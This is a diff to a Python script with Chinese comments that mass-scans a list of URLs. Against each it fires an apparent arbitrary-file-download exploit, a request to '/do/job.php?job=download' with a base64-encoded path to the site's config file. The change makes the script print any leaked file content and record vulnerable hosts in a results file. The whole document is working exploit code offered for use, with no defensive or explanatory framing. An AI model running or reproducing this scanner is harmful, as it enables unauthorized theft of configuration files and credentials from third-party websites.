@@ -9,6 +9,7 @@ headers = {
     'Upgrade-Insecure-Requests': '1'
 }
 
+
 # 从urls.txt文件中读取URL列表
 with open('urls.txt', 'r') as f:
     urls = f.readlines()
@@ -21,13 +22,17 @@ for url in urls:
         # 向url发送GET请求，并传递请求头和请求参数
         response = requests.get(url + '/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8', headers=headers, timeout=30)
         # 判断HTTP响应状态码是否为200
-        if response.status_code != 200:
+        if response.status_code == 200:
+            # 打印响应内容
+            response.encoding = 'gbk'
+            print(response.text)
+            # 保存URL到urll.txt文件
+            with open('urll.txt', 'a') as f:
+                f.write(url + '\n')
+        else:
             # 如果不是200，则跳过当前URL，继续遍历下一个URL
             print(f"URL {url} 响应状态码为 {response.status_code}，跳过当前URL。")
             continue
-        # 打印响应内容
-        response.encoding = 'gbk'
-        print(response.text)
     except requests.exceptions.RequestException as e:
         # 处理HTTP请求错误
         print(f"URL {url} HTTP请求错误：{e}")
